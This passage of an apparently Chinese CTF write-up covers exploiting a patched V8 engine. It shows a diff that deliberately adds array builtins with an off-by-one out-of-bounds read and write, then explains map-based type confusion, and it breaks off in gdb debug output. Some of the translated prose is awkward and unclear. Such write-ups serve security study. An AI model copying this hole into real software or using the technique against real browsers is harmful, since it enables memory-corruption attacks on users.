+<figure class="highlight bash" data-code="cm9vdEBsdWNpOn4vdjhidWlsZC9yb3BlMiMgY2F0IHBhdGNoLmRpZmYgCmRpZmYgLS1naXQgYS9zcmMvYnVpbHRpbnMvYnVpbHRpbnMtYXJyYXkuY2MgYi9zcmMvYnVpbHRpbnMvYnVpbHRpbnMtYXJyYXkuY2MKaW5kZXggM2MyZmUzM2M1YjRiMzMwYzUwOWQyOTI2YmMxZTMwZGFhMWUwOWRiYS4uOTlmMDI3MWUwMzUyMjBjZDcyMjhlOGY5ZDg5NTllM2IyNDhhNmNiNSAxMDA2NDQKLS0tIGEvc3JjL2J1aWx0aW5zL2J1aWx0aW5zLWFycmF5LmNjCisrKyBiL3NyYy9idWlsdGlucy9idWlsdGlucy1hcnJheS5jYwpAQCAtMjk3LDYgKzI5NywzNCBAQCBCVUlMVElOKEFycmF5UHJvdG90eXBlRmlsbCkgewogICByZXR1cm4gR2VuZXJpY0FycmF5RmlsbChpc29sYXRlLCByZWNlaXZlciwgdmFsdWUsIHN0YXJ0X2luZGV4LCBlbmRfaW5kZXgpOwogfQogCitCVUlMVElOKEFycmF5R2V0TGFzdEVsZW1lbnQpCit7CisJSGFuZGxlPEpTUmVjZWl2ZXI+IHJlY2VpdmVyOworCUFTU0lHTl9SRVRVUk5fRkFJTFVSRV9PTl9FWENFUFRJT04oaXNvbGF0ZSwgcmVjZWl2ZXIsIE9iamVjdDo6VG9PYmplY3QoaXNvbGF0ZSwgYXJncy5yZWNlaXZlcigpKSk7CisJSGFuZGxlPEpTQXJyYXk+IGFycmF5ID0gSGFuZGxlPEpTQXJyYXk+OjpjYXN0KHJlY2VpdmVyKTsKKwl1aW50MzJfdCBsZW4gPSBzdGF0aWNfY2FzdDx1aW50MzJfdD4oYXJyYXktPmxlbmd0aCgpLk51bWJlcigpKTsKKwlGaXhlZERvdWJsZUFycmF5IGVsZW1lbnRzID0gRml4ZWREb3VibGVBcnJheTo6Y2FzdChhcnJheS0+ZWxlbWVudHMoKSk7CisJcmV0dXJuICooaXNvbGF0ZS0+ZmFjdG9yeSgpLT5OZXdOdW1iZXIoZWxlbWVudHMuZ2V0X3NjYWxhcihsZW4pKSk7Cit9CisKK0JVSUxUSU4oQXJyYXlTZXRMYXN0RWxlbWVudCkKK3sKKwlIYW5kbGU8SlNSZWNlaXZlcj4gcmVjZWl2ZXI7CisJQVNTSUdOX1JFVFVSTl9GQUlMVVJFX09OX0VYQ0VQVElPTihpc29sYXRlLCByZWNlaXZlciwgT2JqZWN0OjpUb09iamVjdChpc29sYXRlLCBhcmdzLnJlY2VpdmVyKCkpKTsKKwlpbnQgYXJnX2NvdW50ID0gYXJncy5sZW5ndGgoKTsKKwlpZiAoYXJnX2NvdW50ICE9IDIpIC8vIGZpcnN0IHZhbHVlIGlzIGFsd2F5cyB0aGlzCisJeworCQlyZXR1cm4gUmVhZE9ubHlSb290cyhpc29sYXRlKS51bmRlZmluZWRfdmFsdWUoKTsKKwl9CisJSGFuZGxlPEpTQXJyYXk+IGFycmF5ID0gSGFuZGxlPEpTQXJyYXk+OjpjYXN0KHJlY2VpdmVyKTsKKwl1aW50MzJfdCBsZW4gPSBzdGF0aWNfY2FzdDx1aW50MzJfdD4oYXJyYXktPmxlbmd0aCgpLk51bWJlcigpKTsKKwlIYW5kbGU8T2JqZWN0PiB2YWx1ZTsKKwlBU1NJR05fUkVUVVJOX0ZBSUxVUkVfT05fRVhDRVBUSU9OKGlzb2xhdGUsIHZhbHVlLCBPYmplY3Q6OlRvTnVtYmVyKGlzb2xhdGUsIGFyZ3MuYXRPclVuZGVmaW5lZChpc29sYXRlLDEpKSk7CisJRml4ZWREb3VibGVBcnJheSBlbGVtZW50cyA9IEZpeGVkRG91YmxlQXJyYXk6OmNhc3QoYXJyYXktPmVsZW1lbnRzKCkpOworCWVsZW1lbnRzLnNldChsZW4sdmFsdWUtPk51bWJlcigpKTsKKwlyZXR1cm4gUmVhZE9ubHlSb290cyhpc29sYXRlKS51bmRlZmluZWRfdmFsdWUoKTsKK30KKwogbmFtZXNwYWNlIHsKIFY4X1dBUk5fVU5VU0VEX1JFU1VMVCBPYmplY3QgR2VuZXJpY0FycmF5UHVzaChJc29sYXRlKiBpc29sYXRlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJ1aWx0aW5Bcmd1bWVudHMqIGFyZ3MpIHsKZGlmZiAtLWdpdCBhL3NyYy9idWlsdGlucy9idWlsdGlucy1kZWZpbml0aW9ucy5oIGIvc3JjL2J1aWx0aW5zL2J1aWx0aW5zLWRlZmluaXRpb25zLmgKaW5kZXggOTJhNDMwYWEyYzBjYmMzZDY1ZmRmMmYxZjRmMjk1ODI0Mzc5ZGJkOC4uMDI5ODJiMWM4NThlYjMxM2JlZmNiOGFkOWUzOTZkY2RmYmYyZjlhYiAxMDA2NDQKLS0tIGEvc3JjL2J1aWx0aW5zL2J1aWx0aW5zLWRlZmluaXRpb25zLmgKKysrIGIvc3JjL2J1aWx0aW5zL2J1aWx0aW5zLWRlZmluaXRpb25zLmgKQEAgLTMxOSw2ICszMTksOCBAQCBuYW1lc3BhY2UgaW50ZXJuYWwgewogICBURkooQXJyYXlQcm90b3R5cGVQb3AsIGtEb250QWRhcHRBcmd1bWVudHNTZW50aW5lbCkgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgLyogRVM2ICNzZWMtYXJyYXkucHJvdG90eXBlLnB1c2ggKi8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgIENQUChBcnJheVB1c2gpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAorICBDUFAoQXJyYXlHZXRMYXN0RWxlbWVudCkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKKyAgQ1BQKEFycmF5U2V0TGFzdEVsZW1lbnQpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgIFRGSihBcnJheVByb3RvdHlwZVB1c2gsIGtEb250QWRhcHRBcmd1bWVudHNTZW50aW5lbCkgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAvKiBFUzYgI3NlYy1hcnJheS5wcm90b3R5cGUuc2hpZnQgKi8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgQ1BQKEFycmF5U2hpZnQpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCmRpZmYgLS1naXQgYS9zcmMvY29tcGlsZXIvdHlwZXIuY2MgYi9zcmMvY29tcGlsZXIvdHlwZXIuY2MKaW5kZXggNmQ1MzUzMWYxY2JmOWI2NjY5YzZiOThlYTg3NzllODEzM2JhYmU4ZC4uNWRiMzFlOWI3MzNjZGFhMWRkMjA0OWI3MmI3ZmI2MzkyZWE0YTFhYiAxMDA2NDQKLS0tIGEvc3JjL2NvbXBpbGVyL3R5cGVyLmNjCisrKyBiL3NyYy9jb21waWxlci90eXBlci5jYwpAQCAtMTcwNiw2ICsxNzA2LDExIEBAIFR5cGUgVHlwZXI6OlZpc2l0b3I6OkpTQ2FsbFR5cGVyKFR5cGUgZnVuLCBUeXBlciogdCkgewogICAgIC8vIEFycmF5IGZ1bmN0aW9ucy4KICAgICBjYXNlIEJ1aWx0aW5zOjprQXJyYXlJc0FycmF5OgogICAgICAgcmV0dXJuIFR5cGU6OkJvb2xlYW4oKTsKKyAgICBjYXNlIEJ1aWx0aW5zOjprQXJyYXlHZXRMYXN0RWxlbWVudDoKKyAgICAgIHJldHVybiBUeXBlOjpSZWNlaXZlcigpOworICAgIGNhc2UgQnVpbHRpbnM6OmtBcnJheVNldExhc3RFbGVtZW50OgorICAgICAgcmV0dXJuIFR5cGU6OlJlY2VpdmVyKCk7CisKICAgICBjYXNlIEJ1aWx0aW5zOjprQXJyYXlDb25jYXQ6CiAgICAgICByZXR1cm4gVHlwZTo6UmVjZWl2ZXIoKTsKICAgICBjYXNlIEJ1aWx0aW5zOjprQXJyYXlFdmVyeToKZGlmZiAtLWdpdCBhL3NyYy9pbml0L2Jvb3RzdHJhcHBlci5jYyBiL3NyYy9pbml0L2Jvb3RzdHJhcHBlci5jYwppbmRleCA3ZmQxZTQwZjY2MTQ2MWZkYmNmOTIyOGM1Y2U5MTI3YzM0MjhkYzdiLi4zYTliOTdlNGI2NDI2ZTEwMWNhMGNkYzk3Y2UxY2M5MmFhNjg5OTY4IDEwMDY0NAotLS0gYS9zcmMvaW5pdC9ib290c3RyYXBwZXIuY2MKKysrIGIvc3JjL2luaXQvYm9vdHN0cmFwcGVyLmNjCkBAIC0xNjYwLDYgKzE2NjAsMTAgQEAgdm9pZCBHZW5lc2lzOjpJbml0aWFsaXplR2xvYmFsKEhhbmRsZTxKU0dsb2JhbE9iamVjdD4gZ2xvYmFsX29iamVjdCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgQnVpbHRpbnM6OmtBcnJheVByb3RvdHlwZUxhc3RJbmRleE9mLCAxLCBmYWxzZSk7CiAgICAgU2ltcGxlSW5zdGFsbEZ1bmN0aW9uKGlzb2xhdGVfLCBwcm90bywgInBvcCIsIEJ1aWx0aW5zOjprQXJyYXlQcm90b3R5cGVQb3AsCiAgICAgICAgICAgICAgICAgICAgICAgICAgIDAsIGZhbHNlKTsKKyAgICBTaW1wbGVJbnN0YWxsRnVuY3Rpb24oaXNvbGF0ZV8sIHByb3RvLCAiR2V0TGFzdEVsZW1lbnQiLCBCdWlsdGluczo6a0FycmF5R2V0TGFzdEVsZW1lbnQsCisgICAgICAgICAgICAgICAgICAgICAgICAgIDAsIGZhbHNlKTsKKyAgICBTaW1wbGVJbnN0YWxsRnVuY3Rpb24oaXNvbGF0ZV8sIHByb3RvLCAiU2V0TGFzdEVsZW1lbnQiLCBCdWlsdGluczo6a0FycmF5U2V0TGFzdEVsZW1lbnQsCisgICAgICAgICAgICAgICAgICAgICAgICAgIDAsIGZhbHNlKTsKICAgICBTaW1wbGVJbnN0YWxsRnVuY3Rpb24oaXNvbGF0ZV8sIHByb3RvLCAicHVzaCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgIEJ1aWx0aW5zOjprQXJyYXlQcm90b3R5cGVQdXNoLCAxLCBmYWxzZSk7CiAgICAgU2ltcGxlSW5zdGFsbEZ1bmN0aW9uKGlzb2xhdGVfLCBwcm90bywgInJldmVyc2UiLAo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/rope2<span class="comment"># cat patch.diff </span></span><br><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 3c2fe33c5b4b330c509d2926bc1e30daa1e09dba..99f0271e035220cd7228e8f9d8959e3b248a6cb5 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -297,6 +297,34 @@ BUILTIN(ArrayPrototypeFill) &#123;</span><br><span class="line">   <span class="built_in">return</span> GenericArrayFill(isolate, receiver, value, start_index, end_index);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">+BUILTIN(ArrayGetLastElement)</span><br><span class="line">+&#123;</span><br><span class="line">+	Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span><br><span class="line">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+	<span class="built_in">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(len)));</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+BUILTIN(ArraySetLastElement)</span><br><span class="line">+&#123;</span><br><span class="line">+	Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+	int arg_count = args.length();</span><br><span class="line">+	<span class="keyword">if</span> (arg_count != 2) // first value is always this</span><br><span class="line">+	&#123;</span><br><span class="line">+		<span class="built_in">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+	&#125;</span><br><span class="line">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span><br><span class="line">+	Handle&lt;Object&gt; value;</span><br><span class="line">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.atOrUndefined(isolate,1)));</span><br><span class="line">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+	elements.set(len,value-&gt;Number());</span><br><span class="line">+	<span class="built_in">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> namespace &#123;</span><br><span class="line"> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">                                               BuiltinArguments* args) &#123;</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 92a430aa2c0cbc3d65fdf2f1f4f295824379dbd8..02982b1c858eb313befcb8ad9e396dcdfbf2f9ab 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -319,6 +319,8 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \</span><br><span class="line">   /* ES6 <span class="comment">#sec-array.prototype.push */                                          \</span></span><br><span class="line">   CPP(ArrayPush)                                                               \</span><br><span class="line">+  CPP(ArrayGetLastElement)                                                     \</span><br><span class="line">+  CPP(ArraySetLastElement)                                                     \</span><br><span class="line">   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* ES6 <span class="comment">#sec-array.prototype.shift */                                         \</span></span><br><span class="line">   CPP(ArrayShift)                                                              \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index 6d53531f1cbf9b6669c6b98ea8779e8133babe8d..5db31e9b733cdaa1dd2049b72b7fb6392ea4a1ab 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1706,6 +1706,11 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">     // Array <span class="built_in">functions</span>.</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayIsArray:</span><br><span class="line">       <span class="built_in">return</span> Type::Boolean();</span><br><span class="line">+    <span class="keyword">case</span> Builtins::kArrayGetLastElement:</span><br><span class="line">+      <span class="built_in">return</span> Type::Receiver();</span><br><span class="line">+    <span class="keyword">case</span> Builtins::kArraySetLastElement:</span><br><span class="line">+      <span class="built_in">return</span> Type::Receiver();</span><br><span class="line">+</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayConcat:</span><br><span class="line">       <span class="built_in">return</span> Type::Receiver();</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayEvery:</span><br><span class="line">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span class="line">index 7fd1e40f661461fdbcf9228c5ce9127c3428dc7b..3a9b97e4b6426e101ca0cdc97ce1cc92aa689968 100644</span><br><span class="line">--- a/src/init/bootstrapper.cc</span><br><span class="line">+++ b/src/init/bootstrapper.cc</span><br><span class="line">@@ -1660,6 +1660,10 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeLastIndexOf, 1, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;pop&quot;</span>, Builtins::kArrayPrototypePop,</span><br><span class="line">                           0, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">&quot;GetLastElement&quot;</span>, Builtins::kArrayGetLastElement,</span><br><span class="line">+                          0, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">&quot;SetLastElement&quot;</span>, Builtins::kArraySetLastElement,</span><br><span class="line">+                          0, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;push&quot;</span>,</span><br><span class="line">                           Builtins::kArrayPrototypePush, 1, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;reverse&quot;</span>,</span><br></pre></td></tr></table></figure>
+
+<p>这里的&#x2F;src&#x2F;builtins&#x2F;builtins-array.c用来表示添加了一些新函数，这里提到了以下两个添加的函数是ArrayGetLastElement和ArraySetLastElement，逐个分解它们:</p>
+<ul>
+<li><p>ArrayGetLastElement顾名思义,它从数组中最后一个元素,首先计算长度的变量len返回元素存储为len指数,现在i &#x3D; f注意这里,这里的len是绝对长度的数组,因为数组索引从0开始,要访问第0个元素，使用数组[0]，但在这里，因为元素存储在数组中，在len索引处的值因此允许对1个元素进行越界读取。</p>
+</li>
+<li><p>ArraySetLastElement正如名字所说,这个内置函数保存价值的最后索引数组,现在这里,前面的函数,len是计算数组的长度,然后将覆盖指数,定义的元素数组元素(指数)&#x3D;。是的，在这里也有越界的写，但是只写了一个元素。</p>
+</li>
+</ul>
+<p>所以，如上所述，知道有两个函数，使用，以利用这个特定的二进制补丁，并最终chrome浏览器。</p>
+<p>因为这也是一篇非常详细的博客文章，所以将先理解这些概念，然后再继续讨论。</p>
+<p>由于JavaScript是一种动态类型语言，引擎必须将类型信息与每个运行时值一起存储。在v8中，这是通过指针标记和专用类型信息对象(称为映射)的结合来实现的。这些映射用于跟踪在运行时创建的对象，因为这是对象的处理方式，覆盖映射会导致V8引擎内部的一些类型混淆。</p>
+<p>到目前为止，你可能在想究竟如何访问map，最重要的是“如何识别map?”，为此使用了调试版本的d8二进制文件。与allow-natives-syntax将二进制运行时允许您使用</p>
+<figure class="highlight bash" data-code="JURlYnVnUHJpbnQoPG9iamVjdD4pCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(&lt;object&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>将打印对象的相关信息,比方说,例如,声明的数组元素,然后使用%DebugPrint (arr)获得所有关于一个对象的信息包括但不限于:</p>
+<ul>
+<li>map的地址</li>
+<li>元素的指针</li>
+<li>类型信息等</li>
+</ul>
+<figure class="highlight bash" data-code="cm9vdEBsdWNpOn4vdjhidWlsZC92OC9vdXQuZ24veDY0LmRlYnVnIyBnZGIgLi9kOApHTlUgZ2RiIChVYnVudHUgNy4xMS4xLTB1YnVudHUxfjE2LjUpIDcuMTEuMQpDb3B5cmlnaHQgKEMpIDIwMTYgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBJbmMuCkxpY2Vuc2UgR1BMdjMrOiBHTlUgR1BMIHZlcnNpb24gMyBvciBsYXRlciA8aHR0cDovL2dudS5vcmcvbGljZW5zZXMvZ3BsLmh0bWw+ClRoaXMgaXMgZnJlZSBzb2Z0d2FyZTogeW91IGFyZSBmcmVlIHRvIGNoYW5nZSBhbmQgcmVkaXN0cmlidXRlIGl0LgpUaGVyZSBpcyBOTyBXQVJSQU5UWSwgdG8gdGhlIGV4dGVudCBwZXJtaXR0ZWQgYnkgbGF3LiAgVHlwZSAic2hvdyBjb3B5aW5nIgphbmQgInNob3cgd2FycmFudHkiIGZvciBkZXRhaWxzLgpUaGlzIEdEQiB3YXMgY29uZmlndXJlZCBhcyAieDg2XzY0LWxpbnV4LWdudSIuClR5cGUgInNob3cgY29uZmlndXJhdGlvbiIgZm9yIGNvbmZpZ3VyYXRpb24gZGV0YWlscy4KRm9yIGJ1ZyByZXBvcnRpbmcgaW5zdHJ1Y3Rpb25zLCBwbGVhc2Ugc2VlOgo8aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2dkYi9idWdzLz4uCkZpbmQgdGhlIEdEQiBtYW51YWwgYW5kIG90aGVyIGRvY3VtZW50YXRpb24gcmVzb3VyY2VzIG9ubGluZSBhdDoKPGh0dHA6Ly93d3cuZ251Lm9yZy9zb2Z0d2FyZS9nZGIvZG9jdW1lbnRhdGlvbi8+LgpGb3IgaGVscCwgdHlwZSAiaGVscCIuClR5cGUgImFwcm9wb3Mgd29yZCIgdG8gc2VhcmNoIGZvciBjb21tYW5kcyByZWxhdGVkIHRvICJ3b3JkIi4uLgpHRUYgZm9yIGxpbnV4IHJlYWR5LCB0eXBlIGBnZWYnIHRvIHN0YXJ0LCBgZ2VmIGNvbmZpZycgdG8gY29uZmlndXJlCjc5IGNvbW1hbmRzIGxvYWRlZCBmb3IgR0RCIDcuMTEuMSB1c2luZyBQeXRob24gZW5naW5lIDMuNQpbKl0gMSBjb21tYW5kIGNvdWxkIG5vdCBiZSBsb2FkZWQsIHJ1biBgZ2VmIG1pc3NpbmdgIHRvIGtub3cgd2h5LgpSZWFkaW5nIHN5bWJvbHMgZnJvbSAuL2Q4Li4uZG9uZS4KZ2Vm4p6kICByIC0tYWxsb3ctbmF0aXZlcy1zeW50YXgKU3RhcnRpbmcgcHJvZ3JhbTogL3Jvb3QvdjhidWlsZC92OC9vdXQuZ24veDY0LmRlYnVnL2Q4IC0tYWxsb3ctbmF0aXZlcy1zeW50YXgKW1RocmVhZCBkZWJ1Z2dpbmcgdXNpbmcgbGlidGhyZWFkX2RiIGVuYWJsZWRdClVzaW5nIGhvc3QgbGlidGhyZWFkX2RiIGxpYnJhcnkgIi9saWIveDg2XzY0LWxpbnV4LWdudS9saWJ0aHJlYWRfZGIuc28uMSIuCltOZXcgVGhyZWFkIDB4N2ZmZmYyNjBmNzAwIChMV1AgNjA3NyldCltOZXcgVGhyZWFkIDB4N2ZmZmYxZTBlNzAwIChMV1AgNjA3OCldCltOZXcgVGhyZWFkIDB4N2ZmZmYxNjBkNzAwIChMV1AgNjA3OSldClY4IHZlcnNpb24gOC41LjAgKGNhbmRpZGF0ZSkKZDg+IHZhciBhcnIgPSBbMS4xLCAyLjIsIDMuM107CnVuZGVmaW5lZApkOD4gJURlYnVnUHJpbnQoYXJyKQpEZWJ1Z1ByaW50OiAweDEyMDEwODBjNWU0NTogW0pTQXJyYXldCiAtIG1hcDogMHgxMjAxMDgyODE5MDkgPE1hcChQQUNLRURfRE9VQkxFX0VMRU1FTlRTKT4gW0Zhc3RQcm9wZXJ0aWVzXQogLSBwcm90b3R5cGU6IDB4MTIwMTA4MjQ5MjNkIDxKU0FycmF5WzBdPgogLSBlbGVtZW50czogMHgxMjAxMDgwYzVlMjUgPEZpeGVkRG91YmxlQXJyYXlbM10+IFtQQUNLRURfRE9VQkxFX0VMRU1FTlRTXQogLSBsZW5ndGg6IDMKIC0gcHJvcGVydGllczogMHgxMjAxMDgwNDA2ZTkgPEZpeGVkQXJyYXlbMF0+IHsKICAgICNsZW5ndGg6IDB4MTIwMTA4MWMwMTY1IDxBY2Nlc3NvckluZm8+IChjb25zdCBhY2Nlc3NvciBkZXNjcmlwdG9yKQogfQogLSBlbGVtZW50czogMHgxMjAxMDgwYzVlMjUgPEZpeGVkRG91YmxlQXJyYXlbM10+IHsKICAgICAgICAgICAwOiAxLjEKICAgICAgICAgICAxOiAyLjIKICAgICAgICAgICAyOiAzLjMKIH0KMHgxMjAxMDgyODE5MDk6IFtNYXBdCiAtIHR5cGU6IEpTX0FSUkFZX1RZUEUKIC0gaW5zdGFuY2Ugc2l6ZTogMTYKIC0gaW5vYmplY3QgcHJvcGVydGllczogMAogLSBlbGVtZW50cyBraW5kOiBQQUNLRURfRE9VQkxFX0VMRU1FTlRTCiAtIHVudXNlZCBwcm9wZXJ0eSBmaWVsZHM6IDAKIC0gZW51bSBsZW5ndGg6IGludmFsaWQKIC0gYmFjayBwb2ludGVyOiAweDEyMDEwODI4MThlMSA8TWFwKEhPTEVZX1NNSV9FTEVNRU5UUyk+CiAtIHByb3RvdHlwZV92YWxpZGl0eSBjZWxsOiAweDEyMDEwODFjMDQ1MSA8Q2VsbCB2YWx1ZT0gMT4KIC0gaW5zdGFuY2UgZGVzY3JpcHRvcnMgIzE6IDB4MTIwMTA4MjQ5OTExIDxEZXNjcmlwdG9yQXJyYXlbMV0+CiAtIHRyYW5zaXRpb25zICMxOiAweDEyMDEwODI0OTk1ZCA8VHJhbnNpdGlvbkFycmF5WzRdPlRyYW5zaXRpb24gYXJyYXkgIzE6CiAgICAgMHgxMjAxMDgwNDJmM2QgPFN5bWJvbDogKGVsZW1lbnRzX3RyYW5zaXRpb25fc3ltYm9sKT46ICh0cmFuc2l0aW9uIHRvIEhPTEVZX0RPVUJMRV9FTEVNRU5UUykgLT4gMHgxMjAxMDgyODE5MzEgPE1hcChIT0xFWV9ET1VCTEVfRUxFTUVOVFMpPgoKIC0gcHJvdG90eXBlOiAweDEyMDEwODI0OTIzZCA8SlNBcnJheVswXT4KIC0gY29uc3RydWN0b3I6IDB4MTIwMTA4MjQ5MTExIDxKU0Z1bmN0aW9uIEFycmF5IChzZmkgPSAweDEyMDEwODFjYzQxZCk+CiAtIGRlcGVuZGVudCBjb2RlOiAweDEyMDEwODA0MDFlZCA8T3RoZXIgaGVhcCBvYmplY3QgKFdFQUtfRklYRURfQVJSQVlfVFlQRSk+CiAtIGNvbnN0cnVjdGlvbiBjb3VudGVyOiAwCgpbMS4xLCAyLjIsIDMuM10K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/v8/out.gn/x64.debug<span class="comment"># gdb ./d8</span></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by 